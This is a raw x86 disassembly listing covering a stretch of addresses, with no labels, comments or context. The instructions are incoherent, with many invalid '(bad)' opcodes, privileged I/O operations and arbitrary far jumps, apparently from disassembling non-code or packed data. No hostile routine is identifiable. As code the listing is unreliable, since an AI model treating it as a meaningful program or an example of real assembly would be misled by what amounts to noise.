  41dd4d:	mov    ah,0x86
  41dd4f:	add    BYTE PTR [edi-0x1a32d668],cl
  41dd55:	xor    BYTE PTR [esi],cl
  41dd57:	repz aam 0x9
  41dd5a:	cmp    eax,0x2563e438
  41dd5f:	std    
  41dd60:	and    eax,0xdb7898b6
  41dd65:	mov    eax,ds:0x66c60f1a
  41dd6a:	add    eax,0x89a28ca8
  41dd6f:	pop    eax
  41dd70:	(bad)  
  41dd71:	iret   
  41dd72:	retf   
  41dd73:	hlt    
  41dd74:	sahf   
  41dd75:	and    edi,DWORD PTR [ebx+0x3ec00838]
  41dd7b:	inc    eax
  41dd7c:	add    al,0x68
  41dd7e:	dec    edx
  41dd7f:	mov    dl,0xf1
  41dd81:	add    DWORD PTR [ecx+0x4f],0x6c
  41dd85:	add    dl,ah
  41dd87:	adc    BYTE PTR [edi+0x7b405b05],dh
  41dd8d:	add    edi,DWORD PTR [edx+0x61ed8631]
  41dd93:	push   edi
  41dd94:	std    
  41dd95:	pop    ds
  41dd96:	popf   
  41dd97:	jns    0x41ddff
  41dd99:	mov    cl,0x42
  41dd9b:	pop    ds
  41dd9c:	leave  
  41dd9d:	outs   dx,DWORD PTR ds:[esi]
  41dd9e:	aam    0xcf
  41dda0:	mov    bh,BYTE PTR [esi-0x5c]
  41dda3:	dec    eax
  41dda4:	mov    al,ds:0x1d173df5
  41dda9:	fisttp QWORD PTR [ecx]
  41ddab:	loop   0x41dd81
  41ddad:	mov    ds:0xdcf47a8e,eax
  41ddb2:	ret    
  41ddb3:	or     esi,edi
  41ddb5:	mov    ebx,0x51a72f2c
  41ddba:	sub    ebp,DWORD PTR es:0x754e648b
  41ddc1:	ror    dl,1
  41ddc3:	dec    esp
  41ddc4:	pop    edx
  41ddc5:	push   0x31f3110d
  41ddca:	retf   
  41ddcb:	xor    eax,DWORD PTR [edi-0xe]
  41ddce:	sub    DWORD PTR [eax+0x67],esp
  41ddd1:	jb     0x41ddea
  41ddd3:	mov    al,0x54
  41ddd5:	or     ebp,DWORD PTR es:[edi+0x5c]
  41ddd9:	fnstsw WORD PTR [ecx]
  41dddb:	pop    esp
  41dddc:	stos   DWORD PTR es:[edi],eax
  41dddd:	ss push esp
  41dddf:	sti    
  41dde0:	xchg   ecx,eax
  41dde1:	test   eax,0xfa686fb
  41dde6:	arpl   WORD PTR [edx],sp
  41dde8:	jge    0x41de01
  41ddea:	(bad)  
  41ddeb:	daa    
  41ddec:	call   0xd81c:0x6832702c
  41ddf3:	and    BYTE PTR [edi-0x76],ah
  41ddf6:	sahf   
  41ddf7:	fwait
  41ddf8:	inc    esi
  41ddf9:	mov    ds:0xcd03f8f,eax
  41ddfe:	aaa    
  41ddff:	mov    cl,0x8d
  41de01:	cs ret 
  41de03:	mov    esp,0x51499465
  41de08:	xchg   esp,eax
  41de09:	jmp    0x82b5:0x3d7cc411
  41de10:	and    edi,DWORD PTR [ebp-0x7285c828]
  41de16:	or     al,0x96
  41de18:	inc    ecx
  41de19:	adc    DWORD PTR [esi+0x121fc4b7],edx
  41de1f:	(bad)  
  41de20:	cmp    al,0x3b
  41de22:	outs   dx,BYTE PTR ds:[esi]
  41de23:	adc    bh,bl
  41de25:	xor    esi,edi
  41de27:	pop    ebp
  41de28:	retf   
  41de29:	icebp  
  41de2a:	jae    0x41ddbd
  41de2c:	scas   eax,DWORD PTR es:[edi]
  41de2d:	int    0x68
  41de2f:	push   ds
  41de30:	cld    
  41de31:	mov    es,esi
  41de33:	aas    
  41de34:	test   eax,0x2ca02d76
  41de39:	ret    0xab32
  41de3c:	sbb    DWORD PTR [ebx+0xf0f5767],eax
  41de42:	push   edi
  41de43:	loope  0x41de3c
  41de45:	sbb    eax,0xb589799e
  41de4a:	mov    esi,fs
  41de4c:	mov    bh,0xa2
  41de4e:	aaa    
  41de4f:	arpl   WORD PTR [ebx],si
  41de51:	push   ebx
  41de52:	in     eax,dx
  41de53:	scas   al,BYTE PTR es:[edi]
  41de54:	mov    bh,0x18
  41de56:	or     ebx,DWORD PTR [edx-0x727f6feb]
  41de5c:	or     WORD PTR [edx+0x30],si
  41de60:	pop    ebx
  41de61:	ret    
  41de62:	dec    edx
  41de63:	or     BYTE PTR [edi+0x3b455c60],0xd4
  41de6a:	in     al,dx
  41de6b:	dec    edx
  41de6c:	sti    
  41de6d:	xchg   ecx,eax
  41de6e:	paddsw mm5,QWORD PTR [ecx]
  41de71:	fwait
  41de72:	imul   ebp,DWORD PTR [eax+edx*2+0x46a08c34],0x42
  41de7a:	jne    0x41de9c
  41de7c:	out    dx,al
  41de7d:	xchg   ecx,eax
  41de7e:	test   eax,0x96b1744f
  41de83:	xor    DWORD PTR [ebx+0x15],edi
  41de86:	ret    0x9d97
  41de89:	fmul   st,st(6)
  41de8b:	mov    ?,WORD PTR [esi]
  41de8d:	and    bh,al
  41de8f:	adc    eax,ecx
  41de91:	(bad)  
  41de92:	mov    edx,0x3b5fc90
  41de97:	pop    esi
  41de98:	sbb    al,0x5f
  41de9a:	jbe    0x41de8d
  41de9c:	enter  0x491e,0x32
  41dea0:	cwde   
  41dea1:	mov    ds:0x61ce3607,al
  41dea6:	xchg   edi,eax
  41dea7:	dec    edx
  41dea8:	leave  
  41dea9:	mov    ebp,0x17ac4423
  41deae:	cmp    ebp,esi
  41deb0:	inc    esp
  41deb1:	push   ss
  41deb2:	xchg   edx,eax
  41deb3:	mul    dl
  41deb5:	iret   
  41deb6:	push   ecx
  41deb7:	mov    bh,0x43
  41deb9:	das    
  41deba:	leave  
  41debb:	addr16 (bad) 
  41debd:	call   DWORD PTR [edi-0x17]
  41dec0:	lods   eax,DWORD PTR ds:[esi]
  41dec1:	fadd   st,st(2)
  41dec3:	gs push cs
  41dec5:	in     eax,0x6a
  41dec7:	out    0x5c,al
  41dec9:	push   ecx
  41deca:	mov    fs,ebp
  41decc:	enter  0xf9a,0x83
  41ded0:	xchg   esi,eax
  41ded1:	cmp    ebp,DWORD PTR [edi-0x38]
  41ded4:	das    
  41ded5:	rcr    DWORD PTR [eax+0xa],0x6d
  41ded9:	outs   dx,BYTE PTR ds:[esi]
  41deda:	test   esp,esp
  41dedc:	xchg   ebp,eax
  41dedd:	(bad)  
  41dede:	outs   dx,BYTE PTR ds:[esi]
  41dedf:	sahf   
  41dee0:	(bad)  
  41dee1:	mov    bl,0xa1
  41dee3:	into   
  41dee4:	scas   al,BYTE PTR es:[edi]
  41dee5:	call   0xa970:0xb4fcd76d
  41deec:	cmp    al,0x90
  41deee:	jnp    0x41deba
  41def0:	xchg   ecx,eax
  41def1:	sbb    eax,0x68d5bed8
  41def6:	fucomip st,st(4)
  41def8:	int3   
  41def9:	ja     0x41dee1
  41defb:	in     al,0xcc
  41defd:	inc    eax
  41defe:	aaa    
  41deff:	and    al,BYTE PTR [ebx]
  41df01:	stc    
  41df02:	aad    0x78
  41df04:	mov    ds:0xdda4f8ff,eax
  41df09:	sub    BYTE PTR [eax-0x6c18ea25],dh
  41df0f:	pop    edx
  41df10:	push   edx
  41df11:	out    0xc5,al
  41df13:	pop    ds
  41df14:	mov    al,0xc7
  41df16:	or     edi,edx
  41df18:	fwait
  41df19:	push   ecx
  41df1a:	dec    ebx
  41df1b:	xor    al,0xe3
  41df1d:	pop    ebx
  41df1e:	mov    cl,bh
  41df20:	mov    ah,0x37
  41df22:	inc    ebp
  41df23:	(bad)  
  41df24:	fstp   TBYTE PTR [eax]
  41df26:	adc    al,0x2
  41df28:	mov    ch,0x65
  41df2a:	nop
  41df2b:	dec    cx
  41df2d:	jg     0x41df7b
  41df2f:	leave  
  41df30:	mov    WORD PTR [ebx],cs
  41df32:	inc    ebp
  41df33:	xchg   edx,eax
  41df34:	push   cs
  41df35:	or     al,0xf
  41df37:	es daa 
  41df39:	lahf   
  41df3a:	jo     0x41df95
  41df3c:	addr16 pop edi
  41df3e:	repz bound ebx,QWORD PTR [ecx+0x6460fc4a]
  41df45:	int3   
  41df46:	pop    eax
  41df47:	and    al,0x78
  41df49:	jge    0x41df36
  41df4b:	(bad)  
  41df4c:	arpl   WORD PTR [ebx+0x6f1fda05],dx
  41df52:	icebp  
  41df53:	mov    esp,0x12d831b2
  41df58:	push   0x7bb490d5
  41df5d:	or     dh,BYTE PTR [edi]
  41df5f:	(bad)  
  41df60:	cli    
  41df61:	out    dx,al
  41df62:	outs   dx,DWORD PTR ds:[esi]
  41df63:	inc    ebp
  41df64:	xor    ebx,esi
  41df66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df67:	jecxz  0x41df0f
  41df69:	dec    edi
  41df6a:	test   eax,0xfecae7f1
  41df6f:	sbb    eax,0xac9c4a5b
  41df74:	jbe    0x41dfe6
  41df76:	add    cl,bl
  41df78:	leave  
  41df79:	das    
  41df7a:	pop    ds
  41df7b:	or     BYTE PTR [edx],al
  41df7d:	push   ds
  41df7e:	or     al,0x7
  41df80:	cli    
  41df81:	or     bl,BYTE PTR [ebx+0x11224e06]
  41df87:	xchg   edi,eax
  41df88:	mov    ecx,0xc45c0b6b
  41df8d:	shr    BYTE PTR [ebp+0x10b5b271],cl
  41df93:	push   0x6b
  41df95:	fidivr WORD PTR [ebx]
  41df97:	xor    BYTE PTR [eax+eiz*8],dh
  41df9a:	repz xchg esi,eax
  41df9c:	(bad)  
  41df9d:	fsub   DWORD PTR [edi]
  41df9f:	repz mov edi,0x4939b30d
  41dfa5:	lahf   
  41dfa6:	inc    edx
  41dfa7:	(bad)  
  41dfa9:	mov    ebx,0x61db7b7f
  41dfae:	adc    eax,0xd951ff30
  41dfb3:	(bad)  
  41dfb4:	or     al,0xd
  41dfb6:	mov    ebx,0x28fed13b
  41dfbb:	push   ds
  41dfbc:	test   DWORD PTR [edx],ebp
  41dfbe:	pop    es
  41dfbf:	aam    0x53
  41dfc1:	lahf   
  41dfc2:	mov    ?,WORD PTR [eax-0x28]
  41dfc5:	test   DWORD PTR [ebx-0x60],ebp
  41dfc8:	jle    0x41dffe
  41dfca:	adc    al,0xad
  41dfcc:	xchg   BYTE PTR [ebx],dl
  41dfce:	loope  0x41e014
  41dfd0:	in     al,0xeb
  41dfd2:	icebp  
  41dfd3:	inc    edi
  41dfd4:	popf   
  41dfd5:	inc    esi
  41dfd6:	jmp    0x41dfd2
  41dfd8:	jle    0x41df5f
  41dfda:	mov    ?,WORD PTR ds:0x8b1f9927
  41dfe0:	cmc    
  41dfe1:	leave  
  41dfe2:	push   esi
  41dfe3:	das    
  41dfe4:	cmp    BYTE PTR [ebx+0x55],dl
  41dfe7:	or     eax,0x25b9b04d
  41dfec:	nop
  41dfed:	cmp    al,0x5d
  41dfef:	xor    DWORD PTR [ebp-0x64],0xffffffaa
  41dff3:	dec    eax
  41dff4:	leave  
  41dff5:	aas    
  41dff6:	mov    cl,0x4d
  41dff8:	dec    ebx
  41dff9:	loopne 0x41df7c
  41dffb:	in     al,dx
  41dffc:	push   ds
  41dffd:	mov    ecx,0x884cfccd
  41e002:	sbb    dh,BYTE PTR [esp+edi*4-0x80]
  41e006:	loopne 0x41dfdf
  41e008:	and    edi,edi
  41e00a:	add    BYTE PTR [edi+0x60],0x5c
  41e00e:	enter  0x86a5,0x14
  41e012:	adc    eax,0x9cd387b4
  41e017:	push   0xd1683741
  41e01c:	pop    ebx
  41e01d:	push   edi
  41e01e:	mov    ds:0x4bda3161,eax
  41e023:	cmp    al,0xf6
  41e025:	cwde   
  41e026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e027:	stos   DWORD PTR es:[edi],eax
  41e028:	sub    ch,BYTE PTR [esp+ebp*8-0x17e0c4e8]
  41e02f:	cld    
  41e030:	cli    
  41e031:	(bad)
  41e034:	sar    BYTE PTR [esi-0x6d80e46b],0x28
  41e03b:	inc    edx
  41e03c:	add    DWORD PTR [ebx-0x778575c1],esi
  41e042:	cmp    al,0x12
  41e044:	or     esp,DWORD PTR es:[ecx]
  41e047:	pop    eax
  41e048:	push   ds
  41e049:	stc    
  41e04a:	sbb    BYTE PTR [edx],0x56
  41e04d:	jno    0x41e070
  41e04f:	lock fnstcw WORD PTR [ecx]
  41e052:	scas   al,BYTE PTR es:[edi]
  41e053:	adc    esp,DWORD PTR [eax]
  41e055:	fbld   TBYTE PTR [ebp-0x60]
  41e058:	minps  xmm6,XMMWORD PTR [esi-0x2d2eb12f]
  41e05f:	fstp   TBYTE PTR [edx+0x23]
  41e062:	jnp    0x41dfeb
  41e064:	hlt    
  41e065:	and    al,0x6
  41e067:	xor    BYTE PTR [eax+0x15640a66],0x4
  41e06e:	sbb    bh,BYTE PTR [edi]
  41e070:	je     0x41e026
  41e072:	or     ebx,ecx
  41e074:	test   DWORD PTR [esi+0x28],eax
  41e077:	add    bl,al
  41e079:	adc    ecx,DWORD PTR [ebx+0x3e073c2f]
  41e07f:	pop    edx
  41e080:	test   BYTE PTR [esi-0x71be88ff],dl
  41e086:	push   ebx
  41e087:	mov    bh,0xbe
  41e089:	xor    DWORD PTR [esi+0x2bebbc6d],0x4e
  41e090:	leave  
  41e091:	dec    ebx
  41e092:	adc    BYTE PTR [edx],0x74
  41e095:	push   0xffffffdd
  41e097:	push   cs
  41e098:	(bad)  
  41e099:	mov    bl,0x81
  41e09b:	or     al,0x21
  41e09d:	dec    ebx
  41e09e:	adc    esi,DWORD PTR [edi+ebp*1+0x7471b7f0]
  41e0a5:	shl    DWORD PTR [ecx+ebx*1],1
  41e0a8:	add    DWORD PTR [eax],0x27005c84
  41e0ae:	xor    ah,dl
  41e0b0:	dec    ebp
  41e0b1:	repz bound ebp,QWORD PTR [eax+0x5]
  41e0b5:	sbb    bh,BYTE PTR [edi]
  41e0b7:	dec    edx
  41e0b8:	pusha  
  41e0b9:	xor    DWORD PTR [ecx+0x7f270c69],ebx
  41e0bf:	xchg   BYTE PTR [ecx+edi*2],ch
  41e0c2:	pop    ds
  41e0c3:	cli    
  41e0c4:	popf   
  41e0c5:	repnz ins BYTE PTR es:[edi],dx
  41e0c7:	mov    WORD PTR [ecx],ds
  41e0c9:	cdq    
  41e0ca:	gs xchg esp,eax
  41e0cc:	sbb    eax,0xd514795e
  41e0d1:	add    al,dl
  41e0d3:	shl    DWORD PTR [eax-0x545f01fe],0x80
  41e0da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0db:	sbb    BYTE PTR [ebx+eiz*4],bl
  41e0de:	aad    0xb8
  41e0e0:	xor    al,0xc
  41e0e2:	sub    eax,0x152dad7b
  41e0e7:	mov    eax,0x93d446e8
  41e0ec:	nop
  41e0ed:	and    DWORD PTR ds:0x7c34f669,eax
  41e0f3:	xchg   esp,eax
  41e0f4:	mov    al,ds:0xef3918ed
  41e0f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0fa:	pop    esp
  41e0fb:	push   es
  41e0fc:	pop    esp
  41e0fd:	cmp    bh,ah
  41e0ff:	fsub   DWORD PTR [ecx+0x7d1e8ca1]
  41e105:	jmp    0x41e0a6
  41e107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e108:	pusha  
  41e109:	jns    0x41e0f3
  41e10b:	gs test eax,0xb13b340a
  41e111:	iret   
  41e112:	lea    ebx,[ebx-0x43]
  41e115:	push   ebx
  41e116:	sbb    eax,0xd1fa2f44
  41e11b:	inc    edx
  41e11c:	int3   
  41e11d:	or     DWORD PTR [esi-0x4a54cf7f],ebx
  41e123:	bound  esp,QWORD PTR [ebx+0x2cb0d043]
  41e129:	adc    BYTE PTR [edi-0xa88ad4b],0xb8
  41e130:	cld    
  41e131:	push   0xd
  41e133:	fs stos BYTE PTR es:[edi],al
  41e135:	and    BYTE PTR [ecx+0x45],al
  41e138:	shl    ah,0x59
  41e13b:	mov    ds:0x94246391,eax
  41e140:	xor    BYTE PTR [edx+0x3ce2c214],bh
  41e146:	addr16 pop ss
  41e148:	scas   eax,DWORD PTR es:[edi]
  41e149:	pop    ds
  41e14a:	lods   eax,DWORD PTR ds:[esi]
  41e14b:	and    eax,0xe8a6d374
  41e150:	xchg   edi,eax
  41e151:	ret    0xa972
  41e154:	(bad)  
  41e156:	sbb    BYTE PTR [ebx-0x35],dh
  41e159:	retf   
  41e15a:	nop
  41e15b:	jp     0x41e0df
  41e15d:	in     al,0x2c
  41e15f:	(bad)  
  41e160:	push   eax
  41e161:	or     DWORD PTR [ecx+0x33c553e],eax
  41e167:	mov    ch,0x94
  41e169:	stos   BYTE PTR es:[edi],al
  41e16a:	into   
  41e16b:	ins    DWORD PTR es:[edi],dx
  41e16c:	push   edi
  41e16d:	loopne 0x41e110
  41e16f:	jbe    0x41e1af
  41e171:	adc    eax,DWORD PTR [edx+0x6b]
  41e174:	xor    BYTE PTR [ebp-0x69034f0d],ah
  41e17a:	(bad)  
  41e17c:	xchg   ecx,eax
  41e17d:	fidiv  DWORD PTR [ebx+0x7c9053a4]
  41e183:	bound  ebp,QWORD PTR [ecx+0x38605ad4]
  41e189:	xchg   esp,eax
  41e18a:	adc    DWORD PTR [esi-0x44342976],ebx
  41e190:	cdq    
  41e191:	mov    ds:0xbd69327a,eax
  41e196:	aaa    
  41e197:	mov    ch,BYTE PTR [edx+0x36]
  41e19a:	retf   0x14aa
  41e19d:	dec    esp
  41e19e:	ds lahf 
  41e1a0:	mov    al,ds:0xdaf239aa
  41e1a5:	mov    edi,0x33b8df53
  41e1aa:	sbb    eax,0xf99a4b31
  41e1af:	(bad)  
  41e1b0:	inc    edx
  41e1b1:	fnstsw WORD PTR ds:0x608a6ca4
  41e1b7:	enter  0x9ed6,0x66
  41e1bb:	ficom  WORD PTR [esi-0x67]
  41e1be:	or     BYTE PTR [eax+0x6d0b7c9b],bl
  41e1c4:	in     eax,0x31
  41e1c6:	fiadd  DWORD PTR [eax-0x41]
  41e1c9:	retf   
  41e1ca:	shr    DWORD PTR [edi],0xe9
  41e1cd:	jo     0x41e182
  41e1cf:	(bad)  
  41e1d0:	xchg   esi,eax
  41e1d1:	xchg   esi,eax
  41e1d2:	pop    es
  41e1d3:	mov    al,0x3d
  41e1d5:	mov    al,0xb6
  41e1d7:	mov    dh,BYTE PTR [ecx-0x6d]
  41e1da:	jl     0x41e22e
  41e1dc:	sbb    BYTE PTR [ecx],al
  41e1de:	fstp   QWORD PTR [esi+0x50]
  41e1e1:	lds    edx,FWORD PTR [eax-0x19]
  41e1e4:	xor    BYTE PTR [edi+0x33],bl
  41e1e7:	lock mov ebx,0x5ad44e5e
  41e1ed:	es jmp 0x41e1fe
  41e1f0:	adc    al,0x4c
  41e1f2:	cli    
  41e1f3:	xor    bh,cl
  41e1f5:	xor    ah,BYTE PTR [eax-0x3f]
  41e1f8:	mov    edx,0xa3aa8704
  41e1fd:	je     0x41e26c
  41e1ff:	jp     0x41e1c0
  41e201:	cmc    
  41e202:	push   0xffffff93
  41e204:	dec    edx
  41e205:	in     eax,dx
  41e206:	cmp    edi,DWORD PTR [esi+0x36]
  41e209:	scas   eax,DWORD PTR es:[edi]
  41e20a:	les    ebp,FWORD PTR [eax+ecx*1]
  41e20d:	or     DWORD PTR [edi+0x66f0955f],0x69
  41e214:	dec    esp
  41e215:	popa   
  41e216:	adc    BYTE PTR [ecx+0x142aa3b2],ch
  41e21c:	dec    edi
  41e21d:	pop    es
  41e21e:	pop    ds
  41e21f:	xor    eax,0xd5d3f74c
  41e224:	pop    edx
  41e225:	stos   BYTE PTR es:[edi],al
  41e226:	imul   ecx,DWORD PTR [esp+edx*2],0xffffffd0
  41e22a:	and    DWORD PTR [ebx],0x1f8a4c66
  41e230:	les    edx,FWORD PTR [esi+edi*4+0x6b]
  41e234:	and    BYTE PTR [ebx+0x5],dh
  41e237:	xchg   DWORD PTR [ecx+eax*4-0x684ca9f0],edx
  41e23e:	in     al,0xcc
  41e240:	push   ebp
  41e241:	lods   al,BYTE PTR ds:[esi]
  41e242:	addr16 retf 
  41e244:	inc    edx
  41e245:	and    al,0x9c
  41e247:	cmp    DWORD PTR [edi+eiz*8+0x1bf61ba9],0xfffffff0
  41e24f:	xchg   edx,eax
  41e250:	dec    edx
  41e251:	cmc    
  41e252:	fld    TBYTE PTR es:[ebx]
  41e255:	sub    edx,DWORD PTR [ebx-0x22]
  41e258:	inc    esp
  41e259:	xchg   esp,eax
  41e25a:	pop    edi
  41e25b:	xor    al,0xa7
  41e25d:	xor    bh,dh
  41e25f:	mov    al,ds:0xc8994fc
  41e264:	inc    eax
  41e265:	jge    0x41e2a0
  41e267:	mov    ebx,0x716e7a21
  41e26c:	les    esp,FWORD PTR [ecx]
  41e26e:	xor    BYTE PTR [edi+0x23],al
  41e271:	jmp    0x41e274
  41e273:	(bad)  
  41e274:	ins    BYTE PTR es:[edi],dx
  41e275:	dec    eax
  41e276:	scas   al,BYTE PTR es:[edi]
  41e277:	push   cs
  41e278:	popa   
  41e279:	pop    ebx
  41e27a:	jno    0x41e2c7
  41e27c:	mov    esp,0x76f3ca26
  41e281:	les    ecx,FWORD PTR [esi+0x46b68c73]
  41e287:	repz dec edi
  41e289:	pushf  
  41e28a:	xlat   BYTE PTR ds:[ebx]
  41e28b:	test   al,0x4d
  41e28d:	inc    eax
  41e28e:	sbb    BYTE PTR [esi+0x16],dl
  41e291:	imul   BYTE PTR [eax]
  41e293:	daa    
  41e294:	popf   
  41e295:	sub    edi,DWORD PTR [ebx+0x75]
  41e298:	jne    0x41e25c
  41e29a:	arpl   si,si
  41e29c:	popf   
  41e29d:	lods   eax,DWORD PTR ds:[esi]
  41e29e:	sub    BYTE PTR [esi+0x5f],dh
  41e2a1:	push   ds
  41e2a2:	lods   eax,DWORD PTR ds:[esi]
  41e2a3:	adc    al,BYTE PTR [edi-0x5b3e62e2]
  41e2a9:	cli    
  41e2aa:	sub    eax,0xdc9dd486
  41e2af:	mov    edi,0x2c34440f
  41e2b4:	inc    eax
  41e2b5:	or     DWORD PTR [ecx+0x2a893b8a],eax
  41e2bb:	jns    0x41e28d
  41e2bd:	dec    edi
  41e2be:	and    DWORD PTR [edi+0x7e],0xc99c5016
  41e2c5:	pusha  
  41e2c6:	repnz pop ebx
  41e2c8:	add    esi,DWORD PTR [edx-0x32]
  41e2cb:	xlat   BYTE PTR ds:[ebx]
  41e2cc:	xchg   ebp,eax
  41e2cd:	rcl    BYTE PTR [ebx+0x67],1
  41e2d0:	lods   al,BYTE PTR ds:[esi]
  41e2d1:	push   esi
  41e2d2:	xchg   edx,eax
  41e2d3:	sub    al,0xfa
  41e2d5:	mov    bh,0xdf
  41e2d7:	shl    BYTE PTR [eax],cl
  41e2d9:	cs cmp al,0x71
  41e2dc:	push   ebx
  41e2dd:	call   0x9f6c:0xca8ad470
  41e2e4:	jmp    0x131b:0xcb80e69b
  41e2eb:	inc    eax
  41e2ec:	lods   al,BYTE PTR ds:[esi]
  41e2ed:	xlat   BYTE PTR ds:[ebx]
  41e2ee:	gs jle 0x41e277
  41e2f1:	outs   dx,DWORD PTR ds:[esi]
  41e2f2:	adc    ecx,DWORD PTR [ecx+edi*8+0x3e]
  41e2f6:	pop    edi
  41e2f7:	inc    eax
  41e2f8:	ret    
  41e2f9:	loope  0x41e28a
  41e2fb:	push   ebp
  41e2fc:	or     ah,BYTE PTR [esi-0x60]
  41e2ff:	sbb    dh,BYTE PTR [edi+0x5d]
  41e302:	push   0xffffffba
  41e304:	add    al,0x67
  41e306:	push   esi
  41e307:	dec    edx
  41e308:	adc    eax,0x55ed961c
  41e30d:	cmp    ebp,DWORD PTR [edx+esi*1]
  41e310:	adc    ch,BYTE PTR [ebp+0x38597cf8]
  41e316:	mov    ecx,0x3b7cc6a8
  41e31b:	std    
  41e31c:	ss sti 
  41e31e:	imul   ebx,DWORD PTR [edi],0xffffffa7
  41e321:	xchg   ebp,eax
  41e322:	stos   BYTE PTR es:[edi],al
  41e323:	and    eax,0x6774988c
  41e328:	mov    WORD PTR ss:[edx+0x225e2a73],cs
  41e32f:	shl    dl,1
  41e331:	and    dl,0x73
  41e334:	pop    eax
  41e335:	cmp    BYTE PTR [eax],dl
  41e337:	sar    DWORD PTR [ebx],1
  41e339:	inc    ecx
  41e33a:	pop    edx
  41e33b:	nop
  41e33c:	or     DWORD PTR [edx-0x3856a06],ebx
  41e342:	loopne 0x41e32e
  41e344:	add    BYTE PTR [esi],bl
  41e346:	jns    0x41e30f
  41e348:	fisttp DWORD PTR [eax-0x5eae3f0]
  41e34e:	pop    edi
  41e34f:	pop    esi
  41e350:	mov    ds:0xdefe0d10,eax
  41e355:	push   es
  41e356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e357:	mov    edi,0xd42c24f9
  41e35c:	(bad)  
  41e35d:	mov    DWORD PTR [edx-0x318cf5d8],edx
  41e363:	mov    bl,0x48
  41e365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e366:	push   esp
  41e367:	push   edi
  41e368:	push   ecx
  41e369:	mov    eax,ds:0xbeead83f
  41e36e:	jo     0x41e36b
  41e370:	sti    
  41e371:	xor    bl,BYTE PTR [esi-0x19]
  41e374:	cmp    dh,ch
  41e376:	mov    ds:0x530f7765,eax
  41e37b:	js     0x41e320
  41e37d:	pop    edi
  41e37e:	sub    al,0xbd
  41e380:	stc    
  41e381:	hlt    
  41e382:	push   ds
  41e383:	mov    ebx,?
  41e385:	mov    eax,0x520c3660
  41e38a:	mov    ds:0x6259597e,al
  41e38f:	cli    
  41e390:	nop
  41e391:	sub    ebp,esi
  41e393:	lock loope 0x41e3e6
  41e396:	setbe  BYTE PTR [ebx-0x2685e4a7]
  41e39d:	push   ebp
  41e39e:	test   BYTE PTR [ebp+eiz*2+0x107c2146],al
  41e3a5:	cs dec ecx
  41e3a7:	call   0x1a59a709
  41e3ac:	leave  
  41e3ad:	xchg   edi,eax
  41e3ae:	sti    
  41e3af:	cdq    
  41e3b0:	jecxz  0x41e339
  41e3b2:	xchg   edi,eax
  41e3b3:	mov    al,0x1c
  41e3b5:	repnz in al,0xa2
  41e3b8:	out    dx,al
  41e3b9:	mov    al,BYTE PTR [ecx+0x17]
  41e3bc:	jne    0x41e3f7
  41e3be:	push   es
  41e3bf:	gs mov cs:0xd2bde6f8,al
  41e3c6:	sbb    al,BYTE PTR [eax]
  41e3c8:	add    ah,BYTE PTR [ebp-0xdd54bfb]
  41e3ce:	xor    eax,0x6d59d7
  41e3d3:	pop    ds
  41e3d4:	mov    ss,WORD PTR [ecx]
  41e3d6:	test   BYTE PTR [edx+edx*2-0x21fd96aa],cl
  41e3dd:	jnp    0x41e3b9
  41e3df:	ins    BYTE PTR es:[edi],dx
  41e3e0:	pop    esp
  41e3e1:	xor    ax,0xc366
  41e3e5:	sbb    al,0x88
  41e3e7:	or     BYTE PTR [esi],dh
  41e3e9:	adc    edi,DWORD PTR ss:[edx-0x4d21b29b]
  41e3f0:	xor    cl,cl
  41e3f2:	int3   
  41e3f3:	push   esi
  41e3f4:	repnz xor esp,DWORD PTR [esi]
  41e3f7:	xchg   esi,eax
  41e3f8:	(bad)  
  41e3f9:	call   0xeae4:0x106b7c70
  41e400:	scas   eax,DWORD PTR es:[di]
  41e402:	mov    al,0x11
  41e404:	js     0x41e3d3
  41e406:	mov    dh,0x25
  41e408:	enter  0x1270,0x1d
  41e40c:	and    al,0xd7
  41e40e:	and    ebp,ecx
  41e410:	or     ch,BYTE PTR [esi]
  41e412:	sbb    bh,dh
  41e414:	cmp    DWORD PTR [esi-0x26],esp
  41e417:	cmp    BYTE PTR [edx],dh
  41e419:	cmp    eax,esi
  41e41b:	push   es
  41e41c:	daa    
  41e41d:	jnp    0x41e3cf
  41e41f:	scas   eax,DWORD PTR es:[edi]
  41e420:	inc    eax
  41e421:	(bad)  
  41e422:	popa   
  41e423:	mov    ecx,0x52b4a9ac
  41e428:	or     BYTE PTR [ecx],0x14
  41e42b:	or     BYTE PTR [ecx+0x3c],cl
  41e42e:	sub    al,0x6d
  41e430:	mov    cl,0x6
  41e432:	mov    edi,0x2e6f984f
  41e437:	addr16 jmp 0xc1d8:0x5c7624cd
  41e43f:	pop    ds
  41e440:	sbb    edi,ecx
  41e442:	repz ror ah,0x1f
  41e446:	repz pop es
  41e448:	in     eax,0x41
  41e44a:	shl    DWORD PTR [eax+0x1],1
  41e44d:	cs push es
  41e44f:	mov    ds:0x5898861c,al
  41e454:	fmul   st(5),st
  41e456:	std    
  41e457:	dec    esi
  41e458:	add    ah,BYTE PTR [ebp-0x65893482]
  41e45e:	fldl2e 
  41e460:	xor    esp,ebp
  41e462:	adc    dh,0xd3
  41e465:	out    0x5e,eax
  41e467:	cmp    BYTE PTR [ebx+0x14],bl
  41e46a:	pop    ebx
  41e46b:	adc    al,0xb2
  41e46d:	push   0x18
  41e46f:	mov    al,0xe4
  41e471:	xchg   cl,al
  41e473:	fsub   QWORD PTR [edi-0x4bc9b084]
  41e479:	xor    DWORD PTR [esi],edi
  41e47b:	sbb    DWORD PTR [edi-0x29],0x3c
  41e47f:	push   eax
  41e480:	stos   BYTE PTR es:[edi],al
  41e481:	lods   eax,DWORD PTR ds:[esi]
  41e482:	aam    0x9c
  41e484:	or     BYTE PTR [ebx-0x1f],bh
  41e487:	sahf   
  41e488:	je     0x41e43e
  41e48a:	pop    edx
  41e48b:	inc    edi
  41e48c:	mov    eax,0x73a2aab0
  41e491:	jbe    0x41e472
  41e493:	xchg   BYTE PTR [ebx-0x4e],al
  41e496:	add    esi,DWORD PTR [edi+eax*1]
  41e499:	(bad)  
  41e49a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e49b:	outs   dx,DWORD PTR ds:[esi]
  41e49c:	jns    0x41e4d8
  41e49e:	xor    BYTE PTR [edx+eax*4],cl
  41e4a1:	repz bound ebp,QWORD PTR [edi-0x4e5f2686]
